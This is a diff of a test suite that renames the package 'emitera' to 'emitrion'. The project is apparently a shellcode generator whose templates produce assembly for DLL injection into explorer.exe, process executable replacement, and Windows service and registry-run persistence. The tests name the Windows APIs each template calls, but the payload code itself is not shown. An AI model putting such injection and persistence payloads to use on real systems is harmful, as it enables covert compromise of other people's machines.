     asm = t.emit(process_replace_layout, pr_config)
     known_refs = {s.ebp_ref for s in process_replace_layout.all_slots()}
@@ -751,7 +751,7 @@ def test_process_replace_no_hardcoded_offsets(process_replace_layout, pr_config)
 
 
 def test_process_replace_enum_loop(process_replace_layout, pr_config):
-    from emitera.payload_templates.process_replace import ProcessReplaceTemplate
+    from emitrion.payload_templates.process_replace import ProcessReplaceTemplate
     t = ProcessReplaceTemplate()
     asm = t.emit(process_replace_layout, pr_config)
     assert "pr_enum_loop:" in asm
@@ -762,7 +762,7 @@ def test_process_replace_enum_loop(process_replace_layout, pr_config):
 
 
 def test_process_replace_case_insensitive_compare(process_replace_layout, pr_config):
-    from emitera.payload_templates.process_replace import ProcessReplaceTemplate
+    from emitrion.payload_templates.process_replace import ProcessReplaceTemplate
     t = ProcessReplaceTemplate()
     asm = t.emit(process_replace_layout, pr_config)
     assert "or   al, 0x20" in asm
@@ -770,14 +770,14 @@ def test_process_replace_case_insensitive_compare(process_replace_layout, pr_con
 
 
 def test_process_replace_pe32_size(process_replace_layout, pr_config):
-    from emitera.payload_templates.process_replace import ProcessReplaceTemplate
+    from emitrion.payload_templates.process_replace import ProcessReplaceTemplate
     t = ProcessReplaceTemplate()
     asm = t.emit(process_replace_layout, pr_config)
     assert "PROCESSENTRY32.dwSize = 0x128" in asm
 
 
 def test_process_replace_wait_before_close(process_replace_layout, pr_config):
-    from emitera.payload_templates.process_replace import ProcessReplaceTemplate
+    from emitrion.payload_templates.process_replace import ProcessReplaceTemplate
     t = ProcessReplaceTemplate()
     asm = t.emit(process_replace_layout, pr_config)
     wait_ref = process_replace_layout.slot("WaitForSingleObject").ebp_ref
@@ -792,7 +792,7 @@ def test_process_replace_wait_before_close(process_replace_layout, pr_config):
 
 
 def test_process_replace_copyfile_checked(process_replace_layout, pr_config):
-    from emitera.payload_templates.process_replace import ProcessReplaceTemplate
+    from emitrion.payload_templates.process_replace import ProcessReplaceTemplate
     t = ProcessReplaceTemplate()
     asm = t.emit(process_replace_layout, pr_config)
     copy_ref = process_replace_layout.slot("CopyFileA").ebp_ref
@@ -804,7 +804,7 @@ def test_process_replace_copyfile_checked(process_replace_layout, pr_config):
 
 
 def test_process_replace_not_found_closes_snapshot(process_replace_layout, pr_config):
-    from emitera.payload_templates.process_replace import ProcessReplaceTemplate
+    from emitrion.payload_templates.process_replace import ProcessReplaceTemplate
     t = ProcessReplaceTemplate()
     asm = t.emit(process_replace_layout, pr_config)
     lines = asm.splitlines()
@@ -819,7 +819,7 @@ def test_process_replace_not_found_closes_snapshot(process_replace_layout, pr_co
 
 class TestProcessReplaceProbeSlots:
     def test_discovers_api_slots(self, pr_config):
-        from emitera.payload_templates.process_replace import ProcessReplaceTemplate
+        from emitrion.payload_templates.process_replace import ProcessReplaceTemplate
         t = ProcessReplaceTemplate()
         slots = t.probe_slots(pr_config)
         for api in [
@@ -833,8 +833,8 @@ class TestProcessReplaceProbeSlots:
 class TestProcessReplaceAutoDerive:
     @requires_assembler
     def test_full_build_assembles(self, manifest_dir, tmp_path):
-        from emitera.build import build
-        from emitera.payload_templates.base import TemplateConfig
+        from emitrion.build import build
+        from emitrion.payload_templates.base import TemplateConfig
         config = TemplateConfig(
             process_name="notepad.exe",
             src_path="C:\\payload.exe",
@@ -855,7 +855,7 @@ class TestProcessReplaceAutoDerive:
 
 @pytest.fixture
 def svc_config():
-    from emitera.payload_templates.base import TemplateConfig
+    from emitrion.payload_templates.base import TemplateConfig
     return TemplateConfig(
         service_name="TestSvc",
         dst_path="C:\\Windows\\Temp\\svc.exe",
@@ -863,35 +863,35 @@ def svc_config():
 
 
 def test_service_persist_openscm_slot(service_persist_layout, svc_config):
-    from emitera.payload_templates.service_persist import ServicePersistTemplate
+    from emitrion.payload_templates.service_persist import ServicePersistTemplate
     t = ServicePersistTemplate()
     asm = t.emit(service_persist_layout, svc_config)
     assert service_persist_layout.slot("OpenSCManagerA").ebp_ref in asm
 
 
 def test_service_persist_createsvc_slot(service_persist_layout, svc_config):
-    from emitera.payload_templates.service_persist import ServicePersistTemplate
+    from emitrion.payload_templates.service_persist import ServicePersistTemplate
     t = ServicePersistTemplate()
     asm = t.emit(service_persist_layout, svc_config)
     assert service_persist_layout.slot("CreateServiceA").ebp_ref in asm
 
 
 def test_service_persist_startsvc_slot(service_persist_layout, svc_config):
-    from emitera.payload_templates.service_persist import ServicePersistTemplate
+    from emitrion.payload_templates.service_persist import ServicePersistTemplate
     t = ServicePersistTemplate()
     asm = t.emit(service_persist_layout, svc_config)
     assert service_persist_layout.slot("StartServiceA").ebp_ref in asm
 
 
 def test_service_persist_closehandle_slot(service_persist_layout, svc_config):
-    from emitera.payload_templates.service_persist import ServicePersistTemplate
+    from emitrion.payload_templates.service_persist import ServicePersistTemplate
     t = ServicePersistTemplate()
     asm = t.emit(service_persist_layout, svc_config)
     assert service_persist_layout.slot("CloseServiceHandle").ebp_ref in asm
 
 
 def test_service_persist_variable_slots(service_persist_layout, svc_config):
-    from emitera.payload_templates.service_persist import ServicePersistTemplate
+    from emitrion.payload_templates.service_persist import ServicePersistTemplate
     t = ServicePersistTemplate()
     asm = t.emit(service_persist_layout, svc_config)
     assert service_persist_layout.slot("scm_handle").ebp_ref in asm
@@ -899,7 +899,7 @@ def test_service_persist_variable_slots(service_persist_layout, svc_config):
 
 
 def test_service_persist_string_slots(service_persist_layout, svc_config):
-    from emitera.payload_templates.service_persist import ServicePersistTemplate
+    from emitrion.payload_templates.service_persist import ServicePersistTemplate
     t = ServicePersistTemplate()
     asm = t.emit(service_persist_layout, svc_config)
     assert service_persist_layout.slot("service_name").ebp_ref in asm
@@ -909,7 +909,7 @@ def test_service_persist_string_slots(service_persist_layout, svc_config):
 def test_service_persist_no_hardcoded_offsets(service_persist_layout, svc_config):
     import re
 
-    from emitera.payload_templates.service_persist import ServicePersistTemplate
+    from emitrion.payload_templates.service_persist import ServicePersistTemplate
     t = ServicePersistTemplate()
     asm = t.emit(service_persist_layout, svc_config)
     known_refs = {s.ebp_ref for s in service_persist_layout.all_slots()}
@@ -918,22 +918,22 @@ def test_service_persist_no_hardcoded_offsets(service_persist_layout, svc_config
 
 
 def test_service_persist_service_all_access(service_persist_layout, svc_config):
-    from emitera.payload_templates.service_persist import ServicePersistTemplate
+    from emitrion.payload_templates.service_persist import ServicePersistTemplate
     t = ServicePersistTemplate()
     asm = t.emit(service_persist_layout, svc_config)
     assert "SERVICE_ALL_ACCESS" in asm
 
 
 def test_service_persist_auto_start(service_persist_layout, svc_config):
-    from emitera.payload_templates.service_persist import ServicePersistTemplate
+    from emitrion.payload_templates.service_persist import ServicePersistTemplate
     t = ServicePersistTemplate()
     asm = t.emit(service_persist_layout, svc_config)
     assert "SERVICE_AUTO_START" in asm
 
 
 def test_service_persist_rejects_unquoted_spaces(service_persist_layout):
-    from emitera.payload_templates.base import TemplateConfig
-    from emitera.payload_templates.service_persist import ServicePersistTemplate
+    from emitrion.payload_templates.base import TemplateConfig
+    from emitrion.payload_templates.service_persist import ServicePersistTemplate
     t = ServicePersistTemplate()
     config = TemplateConfig(
         service_name="TestSvc",
@@ -945,7 +945,7 @@ def test_service_persist_rejects_unquoted_spaces(service_persist_layout):
 
 class TestServicePersistProbeSlots:
     def test_discovers_api_slots(self, svc_config):
-        from emitera.payload_templates.service_persist import ServicePersistTemplate
+        from emitrion.payload_templates.service_persist import ServicePersistTemplate
         t = ServicePersistTemplate()
         slots = t.probe_slots(svc_config)
         for api in [
@@ -958,8 +958,8 @@ class TestServicePersistProbeSlots:
 class TestServicePersistAutoDerive:
     @requires_assembler
     def test_full_build_assembles(self, manifest_dir, tmp_path):
-        from emitera.build import build
-        from emitera.payload_templates.base import TemplateConfig
+        from emitrion.build import build
+        from emitrion.payload_templates.base import TemplateConfig
         config = TemplateConfig(
             service_name="TestSvc",
             dst_path="C:\\svc.exe",
@@ -979,7 +979,7 @@ class TestServicePersistAutoDerive:
 
 @pytest.fixture
 def di_config():
-    from emitera.payload_templates.base import TemplateConfig
+    from emitrion.payload_templates.base import TemplateConfig
     return TemplateConfig(
         process_name="explorer.exe",
         dst_path="C:\\Windows\\Temp\\payload.dll",
@@ -987,56 +987,56 @@ def di_config():
 
 
 def test_dll_inject_snapshot_slot(dll_inject_layout, di_config):
-    from emitera.payload_templates.dll_inject import DllInjectTemplate
+    from emitrion.payload_templates.dll_inject import DllInjectTemplate
     t = DllInjectTemplate()
     asm = t.emit(dll_inject_layout, di_config)
     assert dll_inject_layout.slot("CreateToolhelp32Snapshot").ebp_ref in asm
 
 
 def test_dll_inject_openprocess_slot(dll_inject_layout, di_config):
-    from emitera.payload_templates.dll_inject import DllInjectTemplate
+    from emitrion.payload_templates.dll_inject import DllInjectTemplate
     t = DllInjectTemplate()
     asm = t.emit(dll_inject_layout, di_config)
     assert dll_inject_layout.slot("OpenProcess").ebp_ref in asm
 
 
 def test_dll_inject_virtualalloc_slot(dll_inject_layout, di_config):
-    from emitera.payload_templates.dll_inject import DllInjectTemplate
+    from emitrion.payload_templates.dll_inject import DllInjectTemplate
     t = DllInjectTemplate()
     asm = t.emit(dll_inject_layout, di_config)
     assert dll_inject_layout.slot("VirtualAllocEx").ebp_ref in asm
 
 
 def test_dll_inject_writemem_slot(dll_inject_layout, di_config):
-    from emitera.payload_templates.dll_inject import DllInjectTemplate
+    from emitrion.payload_templates.dll_inject import DllInjectTemplate
     t = DllInjectTemplate()
     asm = t.emit(dll_inject_layout, di_config)
     assert dll_inject_layout.slot("WriteProcessMemory").ebp_ref in asm
 
 
 def test_dll_inject_createremotethread_slot(dll_inject_layout, di_config):
-    from emitera.payload_templates.dll_inject import DllInjectTemplate
+    from emitrion.payload_templates.dll_inject import DllInjectTemplate
     t = DllInjectTemplate()
     asm = t.emit(dll_inject_layout, di_config)
     assert dll_inject_layout.slot("CreateRemoteThread").ebp_ref in asm
 
 
 def test_dll_inject_getmodulehandle_slot(dll_inject_layout, di_config):
-    from emitera.payload_templates.dll_inject import DllInjectTemplate
+    from emitrion.payload_templates.dll_inject import DllInjectTemplate
     t = DllInjectTemplate()
     asm = t.emit(dll_inject_layout, di_config)
     assert dll_inject_layout.slot("GetModuleHandleA").ebp_ref in asm
 
 
 def test_dll_inject_getprocaddress_slot(dll_inject_layout, di_config):
-    from emitera.payload_templates.dll_inject import DllInjectTemplate
+    from emitrion.payload_templates.dll_inject import DllInjectTemplate
     t = DllInjectTemplate()
     asm = t.emit(dll_inject_layout, di_config)
     assert dll_inject_layout.slot("GetProcAddress").ebp_ref in asm
 
 
 def test_dll_inject_variable_slots(dll_inject_layout, di_config):
-    from emitera.payload_templates.dll_inject import DllInjectTemplate
+    from emitrion.payload_templates.dll_inject import DllInjectTemplate
     t = DllInjectTemplate()
     asm = t.emit(dll_inject_layout, di_config)
     for var in ("snapshot_handle", "target_pid", "proc_handle",
@@ -1045,7 +1045,7 @@ def test_dll_inject_variable_slots(dll_inject_layout, di_config):
 
 
 def test_dll_inject_string_slots(dll_inject_layout, di_config):
-    from emitera.payload_templates.dll_inject import DllInjectTemplate
+    from emitrion.payload_templates.dll_inject import DllInjectTemplate
     t = DllInjectTemplate()
     asm = t.emit(dll_inject_layout, di_config)
     for s in ("process_name", "dll_path", "kernel32_str", "loadlib_str"):
@@ -1055,7 +1055,7 @@ def test_dll_inject_string_slots(dll_inject_layout, di_config):
 def test_dll_inject_no_hardcoded_offsets(dll_inject_layout, di_config):
     import re
 
-    from emitera.payload_templates.dll_inject import DllInjectTemplate
+    from emitrion.payload_templates.dll_inject import DllInjectTemplate
     t = DllInjectTemplate()
     asm = t.emit(dll_inject_layout, di_config)
     known_refs = {s.ebp_ref for s in dll_inject_layout.all_slots()}
@@ -1064,7 +1064,7 @@ def test_dll_inject_no_hardcoded_offsets(dll_inject_layout, di_config):
 
 
 def test_dll_inject_enum_loop(dll_inject_layout, di_config):
-    from emitera.payload_templates.dll_inject import DllInjectTemplate
+    from emitrion.payload_templates.dll_inject import DllInjectTemplate
     t = DllInjectTemplate()
     asm = t.emit(dll_inject_layout, di_config)
     assert "di_enum_loop:" in asm
@@ -1074,7 +1074,7 @@ def test_dll_inject_enum_loop(dll_inject_layout, di_config):
 
 
 def test_dll_inject_case_insensitive_compare(dll_inject_layout, di_config):
-    from emitera.payload_templates.dll_inject import DllInjectTemplate
+    from emitrion.payload_templates.dll_inject import DllInjectTemplate
     t = DllInjectTemplate()
     asm = t.emit(dll_inject_layout, di_config)
     assert "or   al, 0x20" in asm
@@ -1082,14 +1082,14 @@ def test_dll_inject_case_insensitive_compare(dll_inject_layout, di_config):
 
 
 def test_dll_inject_process_all_access(dll_inject_layout, di_config):
-    from emitera.payload_templates.dll_inject import DllInjectTemplate
+    from emitrion.payload_templates.dll_inject import DllInjectTemplate
     t = DllInjectTemplate()
     asm = t.emit(dll_inject_layout, di_config)
     assert "PROCESS_ALL_ACCESS" in asm
 
 
 def test_dll_inject_snapshot_closed_on_miss(dll_inject_layout, di_config):
-    from emitera.payload_templates.dll_inject import DllInjectTemplate
+    from emitrion.payload_templates.dll_inject import DllInjectTemplate
     t = DllInjectTemplate()
     asm = t.emit(dll_inject_layout, di_config)
     lines = asm.splitlines()
@@ -1101,7 +1101,7 @@ def test_dll_inject_snapshot_closed_on_miss(dll_inject_layout, di_config):
 
 
 def test_dll_inject_error_checks(dll_inject_layout, di_config):
-    from emitera.payload_templates.dll_inject import DllInjectTemplate
+    from emitrion.payload_templates.dll_inject import DllInjectTemplate
     t = DllInjectTemplate()
     asm = t.emit(dll_inject_layout, di_config)
     for label in ("di_done", "di_close_proc"):
@@ -1110,7 +1110,7 @@ def test_dll_inject_error_checks(dll_inject_layout, di_config):
 
 class TestDllInjectProbeSlots:
     def test_discovers_api_slots(self, di_config):
-        from emitera.payload_templates.dll_inject import DllInjectTemplate
+        from emitrion.payload_templates.dll_inject import DllInjectTemplate
         t = DllInjectTemplate()
         slots = t.probe_slots(di_config)
         for api in [
@@ -1125,8 +1125,8 @@ class TestDllInjectProbeSlots:
 class TestDllInjectAutoDerive:
     @requires_assembler
     def test_full_build_assembles(self, manifest_dir, tmp_path):
-        from emitera.build import build
-        from emitera.payload_templates.base import TemplateConfig
+        from emitrion.build import build
+        from emitrion.payload_templates.base import TemplateConfig
         config = TemplateConfig(
             process_name="explorer.exe",
             dst_path="C:\\payload.dll",
@@ -1146,7 +1146,7 @@ class TestDllInjectAutoDerive:
 
 @pytest.fixture
 def rp_config():
-    from emitera.payload_templates.base import TemplateConfig
+    from emitrion.payload_templates.base import TemplateConfig
     return TemplateConfig(
         service_name="UpdateSvc",
         dst_path="C:\\Windows\\Temp\\svc.exe",
@@ -1154,35 +1154,35 @@ def rp_config():
 
 
 def test_registry_persist_regopen_slot(registry_persist_layout, rp_config):
-    from emitera.payload_templates.registry_persist import RegistryPersistTemplate
+    from emitrion.payload_templates.registry_persist import RegistryPersistTemplate
     t = RegistryPersistTemplate()
     asm = t.emit(registry_persist_layout, rp_config)
     assert registry_persist_layout.slot("RegOpenKeyExA").ebp_ref in asm
 
 
 def test_registry_persist_regset_slot(registry_persist_layout, rp_config):
-    from emitera.payload_templates.registry_persist import RegistryPersistTemplate
+    from emitrion.payload_templates.registry_persist import RegistryPersistTemplate
     t = RegistryPersistTemplate()
     asm = t.emit(registry_persist_layout, rp_config)
     assert registry_persist_layout.slot("RegSetValueExA").ebp_ref in asm
 
 
 def test_registry_persist_regclose_slot(registry_persist_layout, rp_config):
-    from emitera.payload_templates.registry_persist import RegistryPersistTemplate
+    from emitrion.payload_templates.registry_persist import RegistryPersistTemplate
     t = RegistryPersistTemplate()
     asm = t.emit(registry_persist_layout, rp_config)
     assert registry_persist_layout.slot("RegCloseKey").ebp_ref in asm
 
 
 def test_registry_persist_variable_slot(registry_persist_layout, rp_config):
-    from emitera.payload_templates.registry_persist import RegistryPersistTemplate
+    from emitrion.payload_templates.registry_persist import RegistryPersistTemplate
     t = RegistryPersistTemplate()
     asm = t.emit(registry_persist_layout, rp_config)
     assert registry_persist_layout.slot("reg_handle").ebp_ref in asm
 
 
 def test_registry_persist_string_slots(registry_persist_layout, rp_config):
-    from emitera.payload_templates.registry_persist import RegistryPersistTemplate
+    from emitrion.payload_templates.registry_persist import RegistryPersistTemplate
     t = RegistryPersistTemplate()
     asm = t.emit(registry_persist_layout, rp_config)
     for s in ("reg_subkey", "reg_value_name", "dst_path"):
@@ -1192,7 +1192,7 @@ def test_registry_persist_string_slots(registry_persist_layout, rp_config):
 def test_registry_persist_no_hardcoded_offsets(registry_persist_layout, rp_config):
     import re
 
-    from emitera.payload_templates.registry_persist import RegistryPersistTemplate
+    from emitrion.payload_templates.registry_persist import RegistryPersistTemplate
     t = RegistryPersistTemplate()
     asm = t.emit(registry_persist_layout, rp_config)
     known_refs = {s.ebp_ref for s in registry_persist_layout.all_slots()}
@@ -1201,28 +1201,28 @@ def test_registry_persist_no_hardcoded_offsets(registry_persist_layout, rp_confi
 
 
 def test_registry_persist_hkcu(registry_persist_layout, rp_config):
-    from emitera.payload_templates.registry_persist import RegistryPersistTemplate
+    from emitrion.payload_templates.registry_persist import RegistryPersistTemplate
     t = RegistryPersistTemplate()
     asm = t.emit(registry_persist_layout, rp_config)
     assert "HKEY_CURRENT_USER" in asm
 
 
 def test_registry_persist_reg_sz(registry_persist_layout, rp_config):
-    from emitera.payload_templates.registry_persist import RegistryPersistTemplate
+    from emitrion.payload_templates.registry_persist import RegistryPersistTemplate
     t = RegistryPersistTemplate()
     asm = t.emit(registry_persist_layout, rp_config)
     assert "REG_SZ" in asm
 
 
 def test_registry_persist_error_check(registry_persist_layout, rp_config):
-    from emitera.payload_templates.registry_persist import RegistryPersistTemplate
+    from emitrion.payload_templates.registry_persist import RegistryPersistTemplate
     t = RegistryPersistTemplate()
     asm = t.emit(registry_persist_layout, rp_config)
     assert "jnz  rp_done" in asm
 
 
 def test_registry_persist_cbdata_matches_slot(registry_persist_layout, rp_config):
-    from emitera.payload_templates.registry_persist import RegistryPersistTemplate
+    from emitrion.payload_templates.registry_persist import RegistryPersistTemplate
     t = RegistryPersistTemplate()
     asm = t.emit(registry_persist_layout, rp_config)
     slot_size = registry_persist_layout.slot("dst_path").size
@@ -1230,8 +1230,8 @@ def test_registry_persist_cbdata_matches_slot(registry_persist_layout, rp_config
 
 
 def test_registry_persist_service_name_override(manifest_dir, tmp_path):
-    from emitera.build import build
-    from emitera.payload_templates.base import TemplateConfig
+    from emitrion.build import build
+    from emitrion.payload_templates.base import TemplateConfig
     config = TemplateConfig(
         service_name="CustomVal",
         dst_path="C:\\Windows\\Temp\\svc.exe",
@@ -1248,7 +1248,7 @@ def test_registry_persist_service_name_override(manifest_dir, tmp_path):
 
 class TestRegistryPersistProbeSlots:
     def test_discovers_api_slots(self, rp_config):
-        from emitera.payload_templates.registry_persist import RegistryPersistTemplate
+        from emitrion.payload_templates.registry_persist import RegistryPersistTemplate
         t = RegistryPersistTemplate()
         slots = t.probe_slots(rp_config)
         for api in ["RegOpenKeyExA", "RegSetValueExA", "RegCloseKey"]:
@@ -1258,8 +1258,8 @@ class TestRegistryPersistProbeSlots:
 class TestRegistryPersistAutoDerive:
     @requires_assembler
     def test_full_build_assembles(self, manifest_dir, tmp_path):
-        from emitera.build import build
-        from emitera.payload_templates.base import TemplateConfig
+        from emitrion.build import build
+        from emitrion.payload_templates.base import TemplateConfig
         config = TemplateConfig(
             service_name="UpdateSvc",
             dst_path="C:\\Windows\\Temp\\svc.exe",
@@ -1279,28 +1279,28 @@ class TestRegistryPersistAutoDerive:
 
 @pytest.fixture
 def cp_config():
-    from emitera.payload_templates.base import TemplateConfig
+    from emitrion.payload_templates.base import TemplateConfig
     return TemplateConfig(
         dst_path="C:\\Windows\\System32\\cmd.exe",
     )
 
 
 def test_check_path_getfileattr_slot(check_path_layout, cp_config):
-    from emitera.payload_templates.check_path import CheckPathTemplate
+    from emitrion.payload_templates.check_path import CheckPathTemplate
     t = CheckPathTemplate()
     asm = t.emit(check_path_layout, cp_config)
     assert check_path_layout.slot("GetFileAttributesA").ebp_ref in asm
 
 
 def test_check_path_variable_slot(check_path_layout, cp_config):
-    from emitera.payload_templates.check_path import CheckPathTemplate
+    from emitrion.payload_templates.check_path import CheckPathTemplate
     t = CheckPathTemplate()
     asm = t.emit(check_path_layout, cp_config)
     assert check_path_layout.slot("path_attrs").ebp_ref in asm
 
 
 def test_check_path_string_slot(check_path_layout, cp_config):
-    from emitera.payload_templates.check_path import CheckPathTemplate
+    from emitrion.payload_templates.check_path import CheckPathTemplate
     t = CheckPathTemplate()
     asm = t.emit(check_path_layout, cp_config)
     assert check_path_layout.slot("check_path").ebp_ref in asm
@@ -1309,7 +1309,7 @@ def test_check_path_string_slot(check_path_layout, cp_config):
 def test_check_path_no_hardcoded_offsets(check_path_layout, cp_config):
     import re
 
-    from emitera.payload_templates.check_path import CheckPathTemplate
+    from emitrion.payload_templates.check_path import CheckPathTemplate
     t = CheckPathTemplate()
     asm = t.emit(check_path_layout, cp_config)
     known_refs = {s.ebp_ref for s in check_path_layout.all_slots()}
@@ -1318,7 +1318,7 @@ def test_check_path_no_hardcoded_offsets(check_path_layout, cp_config):
 
 
 def test_check_path_branches(check_path_layout, cp_config):
-    from emitera.payload_templates.check_path import CheckPathTemplate
+    from emitrion.payload_templates.check_path import CheckPathTemplate
     t = CheckPathTemplate()
     asm = t.emit(check_path_layout, cp_config)
     assert "cp_present:" in asm
@@ -1328,7 +1328,7 @@ def test_check_path_branches(check_path_layout, cp_config):
 
 
 def test_check_path_invalid_file_attributes(check_path_layout, cp_config):
-    from emitera.payload_templates.check_path import CheckPathTemplate
+    from emitrion.payload_templates.check_path import CheckPathTemplate
     t = CheckPathTemplate()
     asm = t.emit(check_path_layout, cp_config)
     assert "INVALID_FILE_ATTRIBUTES" in asm
@@ -1336,7 +1336,7 @@ def test_check_path_invalid_file_attributes(check_path_layout, cp_config):
 
 
 def test_check_path_stores_result(check_path_layout, cp_config):
-    from emitera.payload_templates.check_path import CheckPathTemplate
+    from emitrion.payload_templates.check_path import CheckPathTemplate
     t = CheckPathTemplate()
     asm = t.emit(check_path_layout, cp_config)
     attrs_ref = check_path_layout.slot("path_attrs").ebp_ref
@@ -1345,19 +1345,19 @@ def test_check_path_stores_result(check_path_layout, cp_config):
 
 class TestCheckPathProbeSlots:
     def test_discovers_api_slot(self, cp_config):
-        from emitera.payload_templates.check_path import CheckPathTemplate
+        from emitrion.payload_templates.check_path import CheckPathTemplate
         t = CheckPathTemplate()
         slots = t.probe_slots(cp_config)
         assert "GetFileAttributesA" in slots
 
     def test_discovers_variable_slot(self, cp_config):
-        from emitera.payload_templates.check_path import CheckPathTemplate
+        from emitrion.payload_templates.check_path import CheckPathTemplate
         t = CheckPathTemplate()
         slots = t.probe_slots(cp_config)
         assert "path_attrs" in slots
 
     def test_discovers_string_slot(self, cp_config):
-        from emitera.payload_templates.check_path import CheckPathTemplate
+        from emitrion.payload_templates.check_path import CheckPathTemplate
         t = CheckPathTemplate()
         slots = t.probe_slots(cp_config)
         assert "check_path" in slots
@@ -1366,8 +1366,8 @@ class TestCheckPathProbeSlots:
 class TestCheckPathAutoDerive:
     @requires_assembler
     def test_full_build_assembles(self, manifest_dir, tmp_path):
-        from emitera.build import build
-        from emitera.payload_templates.base import TemplateConfig
+        from emitrion.build import build
+        from emitrion.payload_templates.base import TemplateConfig
         config = TemplateConfig(
             dst_path="C:\\Windows\\System32\\cmd.exe",
         )
@@ -1380,8 +1380,8 @@ class TestCheckPathAutoDerive:
         assert len(result.shellcode_bytes) > 0
 
     def test_dst_override_reaches_check_path(self, manifest_dir, tmp_path):
-        from emitera.build import build
-        from emitera.payload_templates.base import TemplateConfig
+        from emitrion.build import build
+        from emitrion.payload_templates.base import TemplateConfig
         config = TemplateConfig(
             dst_path="C:\\custom\\target.exe",
         )
